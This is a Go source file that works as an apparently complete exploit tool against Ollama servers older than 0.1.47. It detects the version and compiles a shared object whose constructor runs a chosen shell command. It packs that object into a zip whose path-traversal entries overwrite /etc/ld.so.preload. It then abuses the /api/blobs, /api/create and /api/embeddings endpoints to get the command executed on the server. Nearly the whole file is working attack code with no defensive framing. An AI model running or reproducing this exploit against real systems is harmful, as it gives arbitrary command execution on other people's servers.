package main

import (
	"archive/zip"
	"bufio"
	"bytes"
	"crypto/sha256"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"strconv"
	"strings"
)

const CODE = `#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void __attribute__((constructor)) myInitFunction() {
    const char *f1 = "/etc/ld.so.preload";
    const char *f2 = "/tmp/hook.so";
    unlink(f1);
    unlink(f2);
    system("bash -c '%s'");
}`

func main() {
	
	var targetUrl string
	var execCmd string
	flag.StringVar(&targetUrl, "target", "", "target url")
	flag.StringVar(&execCmd, "exec", "", "exec command")
	flag.Parse()
	if targetUrl == "" {
		fmt.Println("target url is required")
		os.Exit(1)
	}

	u := FormatUrl(targetUrl)

	detectRes, err := Detect(u)
	if err != nil {
		log.Fatal(err)
	}
	if !detectRes {
		fmt.Println("\nVulnerability does not exist")
		os.Exit(1)
	}
	fmt.Println("\nVulnerability does exist!!!")

	if execCmd == "" {
		fmt.Println("exec command is required")
		os.Exit(1)
	}

	_, err = GenEvilSo(execCmd)
	if err != nil {
		log.Fatal(err)
	}
	evilZipName, err := GenEvilZip()
	if err != nil {
		log.Fatal(err)
	}

	blobSha256Name, err := UploadBlob(u, evilZipName)
	if err != nil {
		log.Fatal(err)
	}
	err = Create(u, strings.ReplaceAll(blobSha256Name, ":", "-"))
	if err != nil {
		log.Fatal(err)
	}
	err = EmbeddingsExec(u, "all-minilm:22m")
	if err != nil {
		log.Fatal(err)
	}
}

func GenEvilSo(cmd string) (string, error) {
	code := fmt.Sprintf(CODE, cmd)
	err := os.WriteFile("tmp.c", []byte(code), 0644)
	if err != nil {
		return "", err
	}

	compile := exec.Command("gcc", "tmp.c", "-o", "hook.so", "-fPIC", "-shared", "-ldl", "-D_GNU_SOURCE")
	err = compile.Run()
	if err != nil {
		fmt.Println(err)
		return "", err
	}
	return "hook.so", nil
}

func GenEvilZip() (string, error) {
	zipFile, err := os.Create("evil.zip")
	if err != nil {
		return "", err
	}
	zw := zip.NewWriter(zipFile)

	preloadFile, err := zw.Create("../../../../../../../../../../etc/ld.so.preload")
	_, err = preloadFile.Write([]byte("/tmp/hook.so"))
	if err != nil {
		return "", err
	}
	soFile, err := zw.Create("../../../../../../../../../../tmp/hook.so")
	if err != nil {
		return "", err
	}
	locSoFile, err := os.Open("hook.so")
	if err != nil {
		return "", err
	}
	defer locSoFile.Close()
	io.Copy(soFile, locSoFile)

	zw.Close()
	zipFile.Close()

	return "evil.zip", nil
}

func UploadBlob(url, fileName string) (string, error) {
	f, err := os.Open(fileName)
	if err != nil {
		return "", err
	}
	defer f.Close()
	h := sha256.New()
	if _, err := io.Copy(h, f); err != nil {
		return "", err
	}
	fName := fmt.Sprintf("sha256:%x", h.Sum(nil))

	_, err = f.Seek(0, 0)
	if err != nil {
		return "", err
	}

	newReader := bufio.NewReader(f)

	res, err := http.Post(url+"/api/blobs/"+fName, "application/octet-stream", newReader)
	if err != nil {
		return "", err
	}

	content, err := io.ReadAll(res.Body)
	if err != nil {
		return "", err
	}
	fmt.Println("http log: " + string(content))
	return fName, nil
}

func Create(url, remoteFilePath string) error {
	jsonContent := []byte(fmt.Sprintf(`{"name": "test","modelfile": "FROM /root/.ollama/models/blobs/%s"}`, remoteFilePath))

	res, err := http.Post(url+"/api/create", "application/json", bytes.NewBuffer(jsonContent))

	if err != nil {
		return err
	}
	content, err := io.ReadAll(res.Body)
	if err != nil {
		return err
	}
	fmt.Println("http log: " + string(content))
	return nil
}

func EmbeddingsExec(url, model string) error {
	for i := 0; i < 3; i++ {
		jsonContent := []byte(fmt.Sprintf(`{"model":"%s","keep_alive": 0}`, model))
		res, err := http.Post(url+"/api/embeddings", "application/json", bytes.NewBuffer(jsonContent))
		if err != nil {
			return err
		}

		if res.StatusCode != 200 {
			fmt.Println("pulling model, please wait......")
			err := PullMinilmModel(url)
			if err != nil {
				return err
			}
		} else {
			content, err := io.ReadAll(res.Body)
			if err != nil {
				return err
			}
			fmt.Println("http log: " + string(content))
			break
		}
	}

	return nil
}

func PullMinilmModel(url string) error {
	jsonContent := `{"name":"all-minilm:22m"}`
	res, err := http.Post(url+"/api/pull", "application/json", bytes.NewBuffer([]byte(jsonContent)))
	if err != nil {
		return err
	}
	content, err := io.ReadAll(res.Body)
	if err != nil {
		return err
	}
	fmt.Println("http log: " + string(content))
	return nil
}

func Detect(url string) (bool, error) {
	res, err := http.Get(url + "/api/version")
	if err != nil {
		return false, err
	}
	var jsonMap map[string]string
	jsonContent, err := io.ReadAll(res.Body)
	if err != nil {
		return false, err
	}
	if err := json.Unmarshal(jsonContent, &jsonMap); err != nil || jsonMap["version"] == "" {
		return false, err
	}
	return isVersionLessThan(jsonMap["version"], "0.1.47"), nil
}

func FormatUrl(u string) string {
	ur, err := url.Parse(u)
	if err != nil {
		fmt.Println(ur)
	}
	return fmt.Sprintf("%s://%s", ur.Scheme, ur.Host)
}

func isVersionLessThan(version, target string) bool {
	v1 := strings.Split(version, ".")
	v2 := strings.Split(target, ".")

	for i := 0; i < len(v1) && i < len(v2); i++ {
		num1, _ := strconv.Atoi(v1[i])
		num2, _ := strconv.Atoi(v2[i])
		if num1 < num2 {
			return true
		} else if num1 > num2 {
			return false
		}
	}

	return len(v1) < len(v2)
}
